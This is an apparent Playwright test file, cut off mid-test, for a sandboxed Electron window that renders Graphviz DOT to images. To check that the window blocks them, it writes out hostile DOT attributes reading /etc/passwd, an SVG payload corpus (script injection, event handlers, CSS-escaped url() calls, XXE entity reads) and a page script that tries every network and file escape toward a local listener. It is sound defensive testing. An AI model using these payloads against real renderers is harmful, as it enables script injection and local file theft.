import { expect, test, type ElectronApplication, type Page } from "@playwright/test";
import { createHash } from "node:crypto";
import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PNG } from "pngjs";
import { FIGURE_IMAGE_MAX, figureImages } from "../../src/shared/smart-text";
import { figureProblem } from "../../src/shared/figure-kinds";
import { launchPyxis } from "./app-under-test";
import { removeTestFolder } from "./cleanup";
import { fromChiediToExams } from "./doors";
import { drawingPinned, pngSize, stagePacks, stagedDrawingPack } from "./drawing-packs";
import { listeners, networkStackScript, resolved } from "./network-probes";

// The drawing window runs text from an AI, or from a plan file somebody sent, through Graphviz. These checks use the real
// window, with the drawing pack only (Python is not staged: graphs need nothing else), and reach it through the handle
// main installs for tests (`pyxisE2eDraw`, see drawTestHandle in src/main/draw-runtime.ts). Nothing here depends on a
// path or a line ending of the machine: the hostile paths are strings inside DOT, which nothing reads.

type Drawn = { image: string } | { error: string; timedOut?: boolean };
type Handle = {
  draw: (payload: unknown) => Promise<Drawn>;
  drawUnchecked: (payload: unknown) => Promise<Drawn>;
  windows: () => number[];
  preferences: () => Record<string, unknown>;
  seen: () => string[];
  setPolicyOff: (off: boolean) => void;
  runScript: (script: string, timeoutMs: number) => Promise<Drawn>;
  evaluate: (script: string) => Promise<unknown>;
};

const draw = (app: ElectronApplication, code: string, extra: Record<string, unknown> = {}) =>
  app.evaluate((_, payload) => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.draw(payload), {
    kind: "graph",
    code,
    ...extra,
  });
const drawUnchecked = (app: ElectronApplication, code: string, extra: Record<string, unknown> = {}) =>
  app.evaluate((_, payload) => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.drawUnchecked(payload), {
    kind: "graph",
    code,
    ...extra,
  });
const windows = (app: ElectronApplication) =>
  app.evaluate(() => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.windows());
const inWindow = <T>(app: ElectronApplication, script: string) =>
  app.evaluate((_, text) => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.evaluate(text), script) as Promise<T>;

/**
 * The schemes the session's request filter was asked about when a page tried every way out, which is what Electron 45
 * gives `webRequest`: the network (http, ws) and the app's own scheme, which it filters. It is never asked about `blob:`
 * or `data:`, which are content of the page's own and no network, nor about a `file:` request from a page of another
 * scheme, which the browser refuses before it gets that far. The pictures the window draws use `blob:` and `data:`, so
 * the filter must not be the thing that lets them work, and it is not.
 */
const SEEN_SCHEMES = ["http", "pyxis-runtime", "ws"];

const automaton = [
  "digraph automaton {",
  "  rankdir=LR; node [shape=circle fontname=\"Helvetica\"];",
  "  start [shape=point]; q2 [shape=doublecircle];",
  "  start -> q0; q0 -> q1 [label=\"a\"]; q1 -> q2 [label=\"b\"]; q2 -> q0 [label=\"c\"]; q1 -> q1 [label=\"a\"];",
  "}",
].join("\n");

/** A graph of n nodes in a ring with a chord from each: n nodes and 2n edges, drawn by the layout asked for. */
const ring = (n: number, layout = "dot") =>
  `digraph { layout=${layout}; ${Array.from({ length: n }, (_, i) => `a${i} -> a${(i + 1) % n}; a${i} -> a${(i + 7) % n}`).join("; ")} }`;

/** 150 nodes and 300 edges joined at random, the same every time, with the attributes given: the most the checks allow. */
function scatter(nodeAttributes: string, graphAttributes = ""): string {
  let state = 1;
  const next = () => (state = (state * 1103515245 + 12345) & 0x7fffffff) >> 4;
  const edges = Array.from({ length: 300 }, () => `a${next() % 150} -> a${next() % 150}`);
  return `digraph { ${graphAttributes ? `${graphAttributes}; ` : ""}node [${nodeAttributes}]; ${edges.join("; ")} }`;
}

async function start(extra: { env?: Record<string, string> } = {}) {
  const userData = mkdtempSync(join(tmpdir(), "pyxis-drawing-"));
  // Only the drawing pack: a graph needs no Python.
  stagePacks(userData, ["drawing"]);
  const app = await launchPyxis({ userData, env: { HOME: userData, ...extra.env } });
  const page = await app.firstWindow();
  await page.getByRole("button", { name: "Salta" }).click();
  await fromChiediToExams(page);
  return { app, page, userData };
}
const finish = async (app: ElectronApplication, userData: string) => {
  await app.close();
  removeTestFolder(userData);
};

/** A picture that came back: a PNG that a stored figure accepts, of a size that can be read, with ink on it. */
function expectPicture(result: Drawn, name: string) {
  expect(result, name).toHaveProperty("image");
  const image = (result as { image: string }).image;
  expect(Object.keys(figureImages({ "figure-test": image })), name).toEqual(["figure-test"]);
  expect(image.length, name).toBeLessThanOrEqual(FIGURE_IMAGE_MAX);
  const size = pngSize(image)!;
  // A layout can be tall and narrow (twopi draws a chain as a column), so the longest side is the one that must be readable.
  expect(Math.max(size.width, size.height), name).toBeGreaterThanOrEqual(200);
  expect(size.width, name).toBeLessThanOrEqual(2000);
  expect(size.height, name).toBeLessThanOrEqual(2000);
  const decoded = PNG.sync.read(Buffer.from(image.split(",")[1]!, "base64"));
  let dark = 0;
  for (let i = 0; i < decoded.data.length; i += 4) if (decoded.data[i]! < 128) dark++;
  // The ground is white, and the drawing is ink on it.
  expect(decoded.data[0], name).toBe(255);
  expect(dark, name).toBeGreaterThan(50);
}

/** What a result may be whatever the text was: a picture that passes, or a failure with a plain message. */
function expectPictureOrFailure(result: Drawn, name: string) {
  if ("image" in result) expect(pngSize(result.image), name).not.toBeNull();
  else expect(result.error, name).toMatch(/^[\x20-\x7e\u00a0-\uffff]{1,500}$/);
}

/**
 * Every way a page reaches out that the test can name, tried by the page itself, as one script. `settled` says what each
 * did: only "blocked" is a pass. Used by the test of the window as built and by the one with its policy turned off.
 */
function waysOut(leak: string): string {
  return `(async () => {
          const settle = (promise) => promise.then(() => "reached", () => "blocked");
          const load = (tag, props) => new Promise((resolve) => {
            const element = document.createElement(tag);
            element.onload = () => resolve("reached");
            element.onerror = () => resolve("blocked");
            Object.assign(element, props);
            document.head.append(element);
            setTimeout(() => resolve("blocked"), 1500);
          });
          const out = {};
          out.fetch = await settle(fetch(${JSON.stringify(leak + "/fetch")}));
          out.fetchNoCors = await settle(fetch(${JSON.stringify(leak + "/nocors")}, { mode: "no-cors" }));
          out.fetchFile = await settle(fetch("file:///etc/hostname"));
          out.fetchOtherHost = await settle(fetch("pyxis-runtime://sandbox/host.js"));
          out.xhr = await settle(new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open("GET", ${JSON.stringify(leak + "/xhr")}); x.onload = resolve; x.onerror = reject; x.send(); }));
          out.image = await load("img", { src: ${JSON.stringify(leak + "/image.png")} });
          out.script = await load("script", { src: ${JSON.stringify(leak + "/script.js")} });
          out.stylesheet = await load("link", { rel: "stylesheet", href: ${JSON.stringify(leak + "/style.css")} });
          // Fonts: a page loading one from the network, or from a file, and the app's own font through the scheme.
          out.fontRemote = await settle(new FontFace("Remote", "url(" + ${JSON.stringify(leak + "/font.woff2")} + ")").load());
          out.fontFile = await settle(new FontFace("File", "url(file:///etc/hostname)").load());
          out.fontOtherHost = await settle(new FontFace("Other", "url(pyxis-runtime://sandbox/host.js)").load());
          out.fontAppFile = await settle(new FontFace("App", "url(pyxis-runtime://draw/fonts/Figtree-Variable.woff2)").load());
          out.otherHostScript = await load("script", { src: "pyxis-runtime://sandbox/host.js" });
          out.packWheel = await settle(import("pyxis-runtime://draw/drawing/schemdraw-0.23-py3-none-any.whl"));
          out.pythonFile = await settle(import("pyxis-runtime://draw/pyodide/pyodide.js"));
          out.importRemote = await settle(import(${JSON.stringify(leak + "/module.js")}));
          out.websocket = await settle(new Promise((resolve, reject) => { try { const s = new WebSocket(${JSON.stringify(leak.replace("http", "ws") + "/ws")}); s.onopen = resolve; s.onerror = reject; s.onclose = reject; } catch (e) { reject(e); } }));
          out.eventSource = await settle(new Promise((resolve, reject) => { const s = new EventSource(${JSON.stringify(leak + "/events")}); s.onopen = resolve; s.onerror = reject; }));
          // A beacon is queued and says true; the server's count at the end shows that it went nowhere.
          navigator.sendBeacon?.(${JSON.stringify(leak + "/beacon")}, "x");
          // Workers: the policy names the one file that may be started, the worker that runs Graphviz. Any other file of the
          // window, and the pack's own, may not.
          const workerFrom = (url, message) => settle(new Promise((resolve, reject) => { try { const w = new Worker(url); w.onmessage = resolve; w.onerror = reject; if (message) w.postMessage(message); setTimeout(reject, 1200); } catch (e) { reject(e); } }));
          out.worker = await workerFrom("pyxis-runtime://draw/draw-host.js");
          out.workerPack = await workerFrom("pyxis-runtime://draw/drawing/graphviz.js");
          out.workerRemote = await workerFrom(${JSON.stringify(leak + "/worker.js")});
          out.workerOwn = await workerFrom("pyxis-runtime://draw/draw-worker.js", { id: 1, code: "digraph { a -> b }", engine: "dot" });
          const frame = document.createElement("iframe");
          frame.src = ${JSON.stringify(leak + "/frame")};
          document.body.append(frame);
          const form = document.createElement("form");
          form.action = ${JSON.stringify(leak + "/form")};
          form.method = "post";
          document.body.append(form);
          try { form.submit(); } catch (e) {}
          out.open = String(window.open(${JSON.stringify(leak + "/open")}));
          // Inline script and string evaluation, which the CSP does not allow.
          const inline = document.createElement("script");
          inline.textContent = "window.__inline = 1";
          document.head.append(inline);
          out.inlineScript = typeof window.__inline === "undefined" ? "blocked" : "ran";
          try { setTimeout("window.__timer = 1", 0); } catch (e) {}
          await new Promise((resolve) => setTimeout(resolve, 50));
          out.timerString = typeof window.__timer === "undefined" ? "blocked" : "ran";
          // The one control: the window's own library does load.
          out.control = await settle(import("pyxis-runtime://draw/drawing/graphviz.js"));
          setTimeout(() => { location.href = ${JSON.stringify(leak + "/navigate")}; }, 0);
          return out;
        })()`;
}


test.describe("the drawing window", () => {
  test.skip(!drawingPinned(), "Requires the pinned drawing fixtures in .tmp/drawing.");
  test.setTimeout(240000);

  test("draws a graph from its text, with the drawing pack alone, on every layout and line ending", async () => {
    const { app, userData } = await start();
    try {
      const drawn = await draw(app, automaton);
      expectPicture(drawn, "automaton");
      // Left to right, the automaton is wider than it is tall, and wide enough to read.
      expect(pngSize((drawn as { image: string }).image)!.width).toBeGreaterThanOrEqual(200);
      // The text as a Windows editor saves it.
      expectPicture(await draw(app, automaton.replaceAll("\n", "\r\n")), "automaton with CRLF endings");
      expectPicture(await draw(app, "graph { a -- b -- c; b -- d }"), "undirected");
      expectPicture(
        await draw(app, 'digraph { subgraph cluster_0 { label="Sistema"; a -> b } b -> c [label="à è ì ò ù"] }'),
        "a cluster and accents",
      );
      for (const layout of ["dot", "neato", "circo", "fdp", "twopi"])
        expectPicture(
          await draw(app, `digraph { layout=${layout}; node [shape=box]; start -> parse -> check -> run -> done; check -> fail -> start }`),
          layout,
        );
      // A figure drawn twice comes out the same size, and the window that drew them is one.
      const first = await draw(app, automaton);
      const second = await draw(app, automaton);
      expect(pngSize((first as { image: string }).image)).toEqual(pngSize((second as { image: string }).image));
      expect(await windows(app)).toHaveLength(1);
      // A text Graphviz cannot read comes back as a failure with its message, which the model can act on.
      // (Sent with the text checks skipped: the ones the checks catch first have messages of their own.)
      const syntax = await drawUnchecked(app, "digraph { a -> b [label=] }");
      expect(syntax).toEqual({ error: 'syntax error in line 1, near "]"' });
      // With the line, and the token cleaned of markup, not Graphviz's message as it wrote it.
      expect(await drawUnchecked(app, "digraph {\n  a -> b\n  c -> -> d [label=<x>]\n}")).toEqual({ error: 'syntax error in line 3, near "-"' });
      // A failed drawing does not spoil the next one, which is drawn with a new instance of the library.
      expectPicture(await draw(app, automaton), "after a failed drawing");
    } finally {
      await finish(app, userData);
    }
  });

  test("starts a new worker for every drawing and ends it after, whether the drawing succeeded or failed", async () => {
    const { app, userData } = await start();
    try {
      expectPicture(await draw(app, automaton), "the window is open");
      // The page makes its worker when it draws, so a count of the workers it makes and ends can be kept from here on.
      await inWindow(
        app,
        `(() => {
          const Real = window.Worker;
          const log = [];
          window.pyxisWorkerLog = log;
          window.Worker = class extends Real {
            constructor(...args) { super(...args); log.push("new"); }
            terminate() { log.push("end"); super.terminate(); }
          };
          return true;
        })()`,
      );
      expectPicture(await draw(app, automaton), "first");
      expectPicture(await draw(app, "graph { a -- b }"), "second");
      expect(await drawUnchecked(app, "digraph { a -> b [label=] }")).toHaveProperty("error");
      expectPicture(await draw(app, automaton), "after a failure");
      expect(await inWindow<string[]>(app, "window.pyxisWorkerLog")).toEqual(["new", "end", "new", "end", "new", "end", "new", "end"]);
      expect(await windows(app)).toHaveLength(1);
    } finally {
      await finish(app, userData);
    }
  });

  test("draws every label in the app's own font, which the picture carries inside itself, and the same text the same way every time", async () => {
    const { app, userData } = await start();
    try {
      // The mechanism, in the window: an SVG shown as an image loads no font of its page, so the font is inside the SVG as
      // a data URL. With it the text is drawn in the font and without it in the fallback, and the first drawing is as
      // good as the later ones, so nothing needs to wait for the font to arrive.
      const font = readFileSync("src/renderer/src/design-system/fonts/Figtree-Variable.woff2").toString("base64");
      await draw(app, automaton);
      const probe = await inWindow<Record<string, { first: string; second: string; ink: number }>>(
        app,
        `(async () => {
          const face = '@font-face{font-family:"Probe";src:url(data:font/woff2;base64,${font}) format("woff2");font-weight:300 900}';
          const svg = (withFace) => '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="70"><style>' + (withFace ? face : '') + '</style><text x="5" y="48" font-size="36" font-family="Probe">Rag gy iltr 0123</text></svg>';
          const sample = async (text) => {
            const url = URL.createObjectURL(new Blob([text], { type: "image/svg+xml" }));
            const image = new Image();
            image.src = url;
            await image.decode();
            const canvas = document.createElement("canvas");
            canvas.width = 400; canvas.height = 70;
            const context = canvas.getContext("2d");
            const paint = () => { context.fillStyle = "#fff"; context.fillRect(0, 0, 400, 70); context.drawImage(image, 0, 0); return canvas.toDataURL("image/png"); };
            const first = paint();
            await new Promise((resolve) => requestAnimationFrame(() => setTimeout(resolve, 30)));
            const second = paint();
            const data = context.getImageData(0, 0, 400, 70).data;
            let ink = 0;
            for (let i = 0; i < data.length; i += 4) if (data[i] < 128) ink++;
            return { first, second, ink };
          };
          return { without: await sample(svg(false)), withFont: await sample(svg(true)), again: await sample(svg(true)) };
        })()`,
      );
      expect(probe.withFont!.ink).not.toBe(probe.without!.ink);
      expect(probe.withFont!.first).not.toBe(probe.without!.first);
      expect(probe.withFont!.first).toBe(probe.withFont!.second);
      expect(probe.again!.second).toBe(probe.withFont!.second);

      // The drawing itself: the same graph drawn again and again is the same picture, byte for byte, so the font was there
      // each time, and the picture is not the one the fallback font would make.
      const hashes = new Set<string>();
      for (let i = 0; i < 6; i++) {
        const result = await draw(app, automaton);
        hashes.add(createHash("sha256").update((result as { image: string }).image).digest("hex"));
      }
      expect(hashes.size).toBe(1);
      // A window made new draws it the same, as a replaced window does after a crash.
      await app.evaluate(({ BrowserWindow }) => {
        BrowserWindow.getAllWindows()
          .find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))
          ?.webContents.forcefullyCrashRenderer();
      });
      await expect.poll(() => windows(app)).toEqual([]);
      const fresh = await draw(app, automaton);
      expect(createHash("sha256").update((fresh as { image: string }).image).digest("hex")).toBe([...hashes][0]);

      // Labels of every kind are drawn: nodes, edges, graph and cluster labels, with accents, and none is clipped by the
      // picture's edge (the drawing has a margin of its own all round).
      const labelled = await draw(
        app,
        'digraph { label="Titolo del grafo"; subgraph cluster_0 { label="Sistema à è ì ò ù"; a [label="Nodo molto lungo di prova"]; a -> b [label="un\'etichetta lunga"] } b -> c [headlabel="testa" taillabel="coda"] }',
      );
      expectPicture(labelled, "every kind of label");
      const decoded = PNG.sync.read(Buffer.from((labelled as { image: string }).image.split(",")[1]!, "base64"));
      const inkAt = (x: number, y: number) => decoded.data[(y * decoded.width + x) * 4]! < 160;
      let edgeInk = 0;
      for (let x = 0; x < decoded.width; x++) edgeInk += Number(inkAt(x, 0)) + Number(inkAt(x, decoded.height - 1));
      for (let y = 0; y < decoded.height; y++) edgeInk += Number(inkAt(0, y)) + Number(inkAt(decoded.width - 1, y));
      expect(edgeInk, "no ink on the picture's edge").toBe(0);
    } finally {
      await finish(app, userData);
    }
  });

  test("refuses the text its checks refuse before any window sees it", async () => {
    const { app, userData } = await start();
    try {
      const refused: Array<[string, string]> = [
        ['image="/etc/passwd"', 'digraph { a [image="/etc/passwd"] }'],
        ["a Windows path", 'digraph { a [image="C:\\\\Windows\\\\win.ini"] }'],
        ['URL="https://example.com"', 'digraph { a [URL="https://example.com"] }'],
        ["href", 'digraph { a -> b [href="https://example.com"] }'],
        ["imagepath", 'digraph { imagepath="/"; a }'],
        ["fontpath", 'digraph { graph [fontpath="/usr/share/fonts"]; a }'],
        ["shapefile", 'digraph { a [shape=custom shapefile="/etc/hosts"] }'],
        ["stylesheet", 'digraph { stylesheet="http://127.0.0.1/x.css"; a }'],
        ["an HTML-like label", 'digraph { a [label=<<TABLE HREF="http://x"><TR><TD><IMG SRC="/etc/passwd"/></TD></TR></TABLE>>] }'],
        ["layout=sfdp", "digraph { layout=sfdp; a -> b }"],
        // Graphviz reads the layout exactly and takes it over the engine it is given, so this one would not draw.
        ["layout=NEATO", "digraph { layout=NEATO; a -> b }"],
        ["more than 150 nodes", `digraph { ${Array.from({ length: 151 }, (_, i) => `n${i}`).join("; ")} }`],
        ["more than 300 edges", `digraph { ${Array.from({ length: 301 }, () => "a -> b").join("; ")} }`],
        ["more than 4000 characters", `digraph { a [label="${"x".repeat(4000)}"] }`],
      ];
      for (const [name, code] of refused) {
        const result = await draw(app, code);
        expect(result, name).toHaveProperty("error");
        expect((result as { error: string }).error, name).not.toMatch(/^runtime-/);
        // The shared check says the same, and its message names what to change.
        if (code.length <= 4000) expect((result as { error: string }).error, name).toBe(figureProblem("graph", code));
      }
      // No drawing was asked of a window: none was opened.
      expect(await windows(app)).toEqual([]);
      // A request that is not a graph, or not even a request, is refused the same way.
      const odd = await app.evaluate(async () => {
        const h = (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw;
        return [
          await h.draw({ kind: "molecule", code: "CCO" }),
          await h.draw({ kind: "graph" }),
          await h.draw(null),
          await h.draw({ kind: "graph", code: 7 }),
        ];
      });
      for (const result of odd) expect(result).toEqual({ error: "runtime-draw-input-invalid" });
      expect(await windows(app)).toEqual([]);
    } finally {
      await finish(app, userData);
    }
  });

  test("makes no request to a local server whatever the text says, even text the checks would refuse", async () => {
    const arrived: string[] = [];
    const server = createServer((request, response) => {
      arrived.push(`${request.method} ${request.url}`);
      response.end("leaked");
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const leak = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    const { app, page, userData } = await start();
    try {
      // The text goes to the window as it is: the point is what the window does with what the checks stop elsewhere.
      const hostile: Record<string, string> = {
        url: `digraph { a [URL="${leak}/url"]; a -> b [href="${leak}/href" labelURL="${leak}/label" edgeURL="${leak}/edge"] }`,
        image: `digraph { imagepath="${leak}"; a [image="${leak}/image.png" shape=box]; b [shape=custom shapefile="${leak}/shape"] }`,
        html: `digraph { a [label=<<TABLE HREF="${leak}/table"><TR><TD><IMG SRC="${leak}/img.png"/></TD><TD HREF="${leak}/td">x</TD></TR></TABLE>>] }`,
        stylesheet: `digraph { stylesheet="${leak}/style.css"; fontpath="${leak}"; a -> b }`,
        id: `digraph { id="x\\"><script src=\\"${leak}/s.js\\"></script>"; a [id="<img src=${leak}/id>"] -> b }`,
        label: `digraph { a [label="<img src=${leak}/l> &lt;script&gt; \\"><svg onload=fetch('${leak}/x')>"] }`,
        tooltip: `digraph { a [tooltip="${leak}/t" comment="${leak}/c" target="_blank" URL="javascript:fetch('${leak}/j')"] }`,
        fonts: `digraph { fontpath="${leak}"; fontname="${leak}/font.ttf"; labelfontname="${leak}/l.ttf"; fontnames="svg"; a [fontname="${leak}/a.ttf" label="x"] -> b [fontname="file:///etc/passwd"] }`,
        fontFamily: `digraph { a [fontname="Arial;}</style><script>window.__pwned=1</script><style>x{" label="y"] }`,
        windowsPaths: 'digraph { a [image="C:\\\\Windows\\\\win.ini"]; b [image="\\\\\\\\server\\\\share\\\\x.png"] ; c [image="/etc/passwd"] }',
      };
      for (const [name, code] of Object.entries(hostile)) expectPictureOrFailure(await drawUnchecked(app, code), name);
      // The same through the request core makes: the checks refuse what names a file, a link or an element, so the window
      // is not asked. A label that only holds markup is a quoted string, which is drawn as the text it is.
      for (const [name, code] of Object.entries(hostile)) {
        const checked = await draw(app, code);
        if (name === "label") expectPicture(checked, name);
        else expect(checked, name).toEqual({ error: figureProblem("graph", code) });
      }

      // Hostile SVG, the other half: what Graphviz could never write is given to the page's own cleaning and rasterising,
      // to show that the page defends itself and is not trusting the renderer.
      const svg = (inner: string, extra = "") =>
        `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="60pt" height="40pt" viewBox="0 0 60 40" ${extra}><polygon fill="red" points="0,0 60,0 60,40 0,40"/>${inner}</svg>`;
      const corpus: Record<string, string> = {
        script: svg("<script>window.__pwned = 1</script>"),
        onload: svg("", 'onload="window.__pwned = 2"'),
        handler: svg('<text x="1" y="10" onclick="window.__pwned = 3" onmouseover="window.__pwned = 4">x</text>'),
        foreignObject: svg(`<foreignObject width="40" height="40"><iframe xmlns="http://www.w3.org/1999/xhtml" src="${leak}/frame"></iframe><img xmlns="http://www.w3.org/1999/xhtml" src="${leak}/fo.png"/></foreignObject>`),
        image: svg(`<image href="${leak}/i.png" width="10" height="10"/><image xlink:href="${leak}/j.png" width="10" height="10"/>`),
        use: svg(`<use href="${leak}/x.svg#a"/><use xlink:href="${leak}/y.svg#b"/>`),
        link: svg(`<a href="javascript:window.__pwned = 5"><text x="1" y="10">x</text></a><a xlink:href="${leak}/link"><text x="1" y="20">y</text></a>`),
        style: svg(`<style>@import url(${leak}/c.css); polygon { fill: url(${leak}/f) }</style>`),
        filter: svg(`<filter id="f"><feImage href="${leak}/fe.png"/></filter><rect filter="url(#f)" width="5" height="5"/>`),
        animate: svg('<set attributeName="onmouseover" to="window.__pwned = 6"/><animate attributeName="href" values="javascript:window.__pwned = 7"/>'),
        fillUrl: svg(`<polygon fill="url(${leak}/f.svg#x)" points="0,0 5,5 0,5"/>`),
        // An attribute of a drawing is read as CSS, which reads escapes: these are url(http://...) to a browser.
        fillEscapedLetter: svg(`<polygon fill="u\\72l(${leak}/e1)" points="0,0 5,5 0,5"/>`),
        fillEscapedHex: svg(`<polygon fill="\\75rl(${leak}/e2)" points="0,0 5,5 0,5"/>`),
        fillEscapedAll: svg(`<polygon fill="\\75\\72\\6c(${leak}/e3)" points="0,0 5,5 0,5"/>`),
        fillComment: svg(`<polygon fill="url(/**/${leak}/e4)" points="0,0 5,5 0,5"/>`),
        styleAttribute: svg(`<polygon style="fill:url(${leak}/s)" points="0,0 5,5 0,5"/>`),
        dataUri: svg('<image href="data:image/svg+xml;base64,PHN2Zy8+" width="5" height="5"/>'),
        entity: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY secret SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="60pt" height="40pt"><text>&secret;</text></svg>`,
        entityHttp: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY secret SYSTEM "${leak}/entity">]><svg xmlns="http://www.w3.org/2000/svg" width="60pt" height="40pt"><text>&secret;</text></svg>`,
        nested: svg(`<svg><svg onload="window.__pwned = 8"><script>window.__pwned = 9</script></svg></svg>`),
        mathml: svg('<math><mi xlink:href="javascript:window.__pwned = 10">x</mi></math>'),
        notSvg: `<html><body><script>window.__pwned = 11</script></body></html>`,
        empty: "",
      };
      for (const [name, text] of Object.entries(corpus)) {
        const cleaned = await inWindow<{ ok: boolean; svg?: string; error?: string }>(
          app,
          `window.pyxisDraw.clean(${JSON.stringify(text)})`,
        );
        if (cleaned.ok) {
          const markup = cleaned.svg!;
          for (const forbidden of [
            /<script/i, /<foreignobject/i, /<image/i, /<use[\s>/]/i, /<a[\s>]/i, /<style/i, /<iframe/i, /<set[\s>/]/i,
            /<animate/i, /<filter/i, /<feimage/i, /\son\w+\s*=/i, /href\s*=/i, /javascript:/i, /\bsrc\s*=/i, /<!entity/i,
            /url\(\s*['"]?(?!#)/i, /data:/i, /<math/i, /127\.0\.0\.1/,
          ])
            expect(markup, `${name} must not keep ${forbidden}`).not.toMatch(forbidden);
        } else expect(cleaned.error, name).toMatch(/\S/);
        // Whatever it was, rasterising it gives a picture or a failure, and runs nothing.
        const picture = await inWindow<{ ok: boolean; png?: string; error?: string }>(
          app,
          `window.pyxisDraw.fromSvg(${JSON.stringify(text)})`,
        );
        if (picture.ok) expect(pngSize(picture.png!), name).not.toBeNull();
        else expect(picture.error, name).toMatch(/\S/);
      }
      expect(await inWindow<string>(app, "typeof window.__pwned")).toBe("undefined");
      expect(await inWindow<number>(app, "document.scripts.length")).toBe(1);
      expect(await inWindow<string>(app, "location.href")).toBe("pyxis-runtime://draw/index.html");
      // Time for any late request to arrive.
      await page.waitForTimeout(1000);
      expect(arrived).toEqual([]);
      // The server does record what reaches it: the app's own process, which has a network, is heard.
      await app.evaluate((_, url) => fetch(url).then((reply) => reply.text()), `${leak}/control`);
      expect(arrived).toEqual(["GET /control"]);
    } finally {
      await finish(app, userData);
      await new Promise((resolve) => server.close(resolve));
    }
  });

  test("has no way out: no network of any kind, no files, no Node, no new window, and nothing else of the app", async () => {
    const arrived: string[] = [];
    const server = createServer((request, response) => {
      arrived.push(`${request.method} ${request.url}`);
      response.end("leaked");
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const port = (server.address() as AddressInfo).port;
    const leak = `http://127.0.0.1:${port}`;
    const { app, page, userData } = await start();
    try {
      expectPicture(await draw(app, automaton), "the window is open");
      const before = await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().length);

      // How the window was made, read from main.
      const made = await app.evaluate(({ BrowserWindow, session }) => {
        const target = BrowserWindow.getAllWindows().find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))!;
        return {
          visible: target.isVisible(),
          persistent: target.webContents.session.isPersistent(),
          storagePath: target.webContents.session.storagePath ?? null,
          ownSession: target.webContents.session !== session.defaultSession,
          url: target.webContents.getURL(),
          preferences: (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.preferences(),
        };
      });
      expect(made).toMatchObject({
        visible: false,
        persistent: false,
        storagePath: null,
        ownSession: true,
        url: "pyxis-runtime://draw/index.html",
      });
      // The window is made sandboxed, without Node, isolated, with web security and no preload.
      expect(made.preferences).toMatchObject({
        sandbox: true,
        nodeIntegration: false,
        contextIsolation: true,
        webSecurity: true,
        webviewTag: false,
        devTools: false,
      });
      expect(made.preferences).not.toHaveProperty("preload");
      // What the page can see: nothing of Node and nothing of the app's own bridge.
      expect(
        await inWindow<string[]>(
          app,
          "['require','process','module','Buffer','global','pyxis','electron','ipcRenderer','__dirname'].filter((name) => typeof globalThis[name] !== 'undefined')",
        ),
      ).toEqual([]);

      // Every way a page reaches out, tried by the page itself. `settled` says what each did: only "blocked" is a pass.
      const attempts = await inWindow<Record<string, string>>(app, waysOut(leak));
      expect(attempts).toEqual({
        fetch: "blocked",
        fetchNoCors: "blocked",
        fetchFile: "blocked",
        fetchOtherHost: "blocked",
        xhr: "blocked",
        image: "blocked",
        script: "blocked",
        stylesheet: "blocked",
        fontRemote: "blocked",
        fontFile: "blocked",
        fontOtherHost: "blocked",
        fontAppFile: "blocked",
        otherHostScript: "blocked",
        packWheel: "blocked",
        pythonFile: "blocked",
        importRemote: "blocked",
        websocket: "blocked",
        eventSource: "blocked",
        worker: "blocked",
        workerPack: "blocked",
        workerRemote: "blocked",
        workerOwn: "reached",
        open: "null",
        inlineScript: "blocked",
        timerString: "blocked",
        control: "reached",
      });
      await page.waitForTimeout(1500);
      // The navigation was refused: the window is where it was, no window was added, and the server saw nothing.
      expect(await inWindow<string>(app, "location.href")).toBe("pyxis-runtime://draw/index.html");
      expect(await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().length)).toBe(before);
      expect(arrived).toEqual([]);
      // The server does record what reaches it: the app's own process, which has a network, is heard.
      await app.evaluate((_, url) => fetch(url).then((reply) => reply.text()), `${leak}/control`);
      expect(arrived).toEqual(["GET /control"]);
      // And the window still draws.
      expectPicture(await draw(app, automaton), "after the attempts");
    } finally {
      await finish(app, userData);
      await new Promise((resolve) => server.close(resolve));
    }
  });

  test("has no way out through the network stack either: WebRTC and preconnect go nowhere, and no name is looked up for them", async () => {
    // What the session's request filter cannot see: WebRTC opens its own sockets, and <link rel=preconnect> and
    // dns-prefetch are the network stack's own work, with no request for the filter. A UDP listener, a TCP server that
    // counts connections and a log of the network stack's DNS work show that none of it leaves the window.
    const { datagrams, connections, udpPort, tcpPort, close } = await listeners();
    const host = `leak-${Math.random().toString(36).slice(2)}.example.invalid`;
    const hintHost = `hint-${Math.random().toString(36).slice(2)}.example.invalid`;
    const { app, userData } = await start();
    const log = join(userData, "net-log.json");
    try {
      expectPicture(await draw(app, automaton), "the window is open");
      await app.evaluate(async ({ BrowserWindow }, path) => {
        const target = BrowserWindow.getAllWindows().find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))!;
        await target.webContents.session.netLog.startLogging(path, { captureMode: "everything" });
      }, log);
      const outcome = await inWindow<Record<string, string>>(app, networkStackScript(host, hintHost, udpPort, tcpPort));
      await app.evaluate(async ({ BrowserWindow }) => {
        const target = BrowserWindow.getAllWindows().find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))!;
        await target.webContents.session.netLog.stopLogging();
      });
      expect(outcome.webrtc).toBeDefined();
      // Nothing was heard: no datagram, no connection, and the network stack did no DNS work for the names the page tried
      // (the log of its events holds none for them).
      const lookups = resolved(log, host);
